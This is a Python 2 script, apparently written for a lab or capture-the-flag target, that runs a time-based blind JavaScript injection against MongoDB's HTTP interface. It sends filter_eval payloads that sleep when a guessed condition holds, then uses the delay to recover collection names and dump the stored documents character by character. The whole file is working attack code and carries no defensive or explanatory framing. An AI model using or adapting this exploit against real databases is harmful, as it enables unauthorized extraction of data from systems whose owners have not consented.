#!/usr/bin/python
from time import *
import urllib

def get_ans(query):
	t1 = int("%u" % time()) 
	url = 'http://localhost:28017/admin/$cmd/?filter_eval=conn = new Mongo("127.0.0.1"); db = conn.getDB("secure_nosql"); if ( '+query+') { sleep(9000); exit; }&limit=1'
	urllib.urlopen(url)
	t2 = int("%u" % time())
	if (t2 - t1) >= 2 :
	 	return 1
	else:
		return 0

def get_coll_names_count(num):
	print "*****************\nGetting length of "+str(num)+" collection\n*****************"
	count = 0
	while get_ans('db.getCollectionNames()['+str(num)+'].length == "'+str(count)+'"') != 1:
		print get_ans('db.getCollectionNames()[0].length == "'+str(count)+'"')
		print "Trying "+str(count)+" symbols"
		count+=1
    
	print "Found - "+str(count)+" symbols"
	return count


def get_coll_names(num):
	print "*****************\nGetting the name of "+str(num)+" collection\n*****************"
	word=''
	for a in xrange(get_coll_names_count(num)):
			for sym in "abcdefghijklmnopqrstuvwxyz":
				print "["+str(a)+"] Trying '"+sym+"'"
				if get_ans('db.getCollectionNames()['+str(num)+']['+str(a)+'] == "'+str(sym)+'"') == 1:
					print "["+str(a)+"] Found '"+sym+"'"
					word += sym
					print word
					break
	print word
	return word


def get_document_from_collection_count(num, col):
	print "*****************\nGetting length of "+str(num)+" document in "+str(col)+" collection \n*****************"
	count = 0
	while get_ans('tojson(db.'+str(col)+'.find()['+str(num)+']).length == "'+str(count)+'"') != 1:
		print "Trying "+str(count)+" symbols"
		count+=1
    
	print "Found - "+str(count)+" symbols"
	return count


def get_document_from_collection(num, col):
	print "*****************\nGetting "+str(num)+" from "+col+" collection\n*****************"
	word=''
	for a in xrange(50, get_document_from_collection_count(num, col)):
			for sym in "ABCDEFGHIJKLMNOPQRSTUVWXYZ<>,./?abcdefghijklmnopqrstuvwxyz: {}]['\"!@#$^%&*()_-1234567890=\t\n":
				print "["+str(a)+"] Trying '"+sym+"'"
				if get_ans('tojson(db.'+col+'.find()['+str(num)+'])['+str(a)+'] == "'+str(urllib.quote_plus(sym))+'"') == 1:
					print "["+str(a)+"] Found '"+sym+"'"
					word += sym
					print word
					break
	print word
	return word


#get_document_from_collection(0, get_coll_names(2))
